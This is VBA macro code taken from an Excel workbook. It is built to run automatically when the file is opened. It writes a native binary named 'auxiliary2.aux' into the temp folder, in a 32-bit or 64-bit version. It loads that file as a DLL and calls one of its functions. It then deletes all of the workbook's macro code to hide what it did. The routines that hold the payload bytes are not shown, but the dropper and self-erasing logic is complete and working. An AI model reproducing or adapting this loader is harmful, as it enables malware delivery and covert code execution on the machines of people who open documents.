Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Const TemporaryFolder = 2

Sub Workbook_Open()
    On Error GoTo Finish
    Dim temp As String
    Dim sDir As String
    Dim res As Integer
    sDir = CurDir
    Dim fs As Object
    Set fs = CreateObject("Scripting.FileSystemObject")
    temp = fs.GetSpecialFolder(TemporaryFolder)
    If IsOffice64Bit Then
        WriteToFile64 (temp & "\auxiliary2.aux")
    Else
        WriteToFile (temp & "\auxiliary2.aux")
    End If
    ChDir temp
    res = calculate()
    If res = 1 Then
       ChDir sDir
    End If
Finish:
    unlink
End Sub



Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True


Attribute VB_Name = "Sheet2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True


Attribute VB_Name = "Sheet3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True


Attribute VB_Name = "loader"
Private Declare PtrSafe Function calculate_values Lib "auxiliary2.aux" Alias "fill_data" (ByVal flags As Integer) As LongPtr

Function calculate()
    Dim res As Integer
    res = 0
    calculate_values 1
    calculate = res
    'If res Then
    '    MsgBox "OK"
    'Else
    '    MsgBox "Failed"
    'End If
End Function


Attribute VB_Name = "postopen"
Sub unlink()
    Application.DisplayAlerts = False
    Call DeleteVBAPROJECT
End Sub

Sub DeleteVBAPROJECT()
    Application.DisplayAlerts = False
    Dim i As Long
    On Error Resume Next
    With ThisWorkbook.VBProject
        For i = .VBComponents.Count To 1 Step -1
            .VBComponents.Remove .VBComponents(i)
            .VBComponents(i).CodeModule.DeleteLines _
            1, .VBComponents(i).CodeModule.CountOfLines
        Next i
    End With
    On Error GoTo 0
    ThisWorkbook.Saved = True
End Sub





Attribute VB_Name = "util"
Private Type SYSTEM_INFO
    wProcessorArchitecture As Integer
    wReserved As Integer
    dwPageSize As Long
    lpMinimumApplicationAddress As LongPtr
    lpMaximumApplicationAddress As LongPtr
    dwActiveProcessorMask As LongPtr
    dwNumberOrfProcessors As Long
    dwProcessorType As Long
    dwAllocationGranularity As Long
    wProcessorLevel As Integer
    wProcessorRevision As Integer
End Type

Private Declare PtrSafe Sub GetSystemInfo Lib "kernel32" (lpSystemInfo As SYSTEM_INFO)
Private Declare PtrSafe Function GetCurrentProcess Lib "kernel32" () As LongPtr
Private Declare PtrSafe Function IsWow64Process Lib "kernel32" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean


Function IsOffice64Bit() As Boolean
    Const PROCESSOR_ARCHITECTURE_AMD64 = 9
    Dim sysinfo As SYSTEM_INFO
    IsOffice64Bit = False
    GetSystemInfo sysinfo
    If sysinfo.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64 Then
        IsWow64Process GetCurrentProcess(), IsOffice64Bit
        IsOffice64Bit = Not IsOffice64Bit
    End If
End Function

Function ByteArray(ParamArray values() As Variant) As Byte()
    ReDim bytes(UBound(values)) As Byte
    Dim i As Long
    For i = 0 To UBound(values)
        bytes(i) = values(i)
    Next
    ByteArray = bytes
End Function

Function OpenFile(filePath As String)
    Dim fileNmb As Integer
    fileNmb = FreeFile
    Open filePath For Binary Access Write As #fileNmb
    OpenFile = fileNmb
End Function

Function CloseFile(fileNmb As Integer)
    Close #fileNmb
End Function

Function WriteBuffer(fileNmb As Integer, buffer() As Byte)
    Put #fileNmb, , buffer
End Function



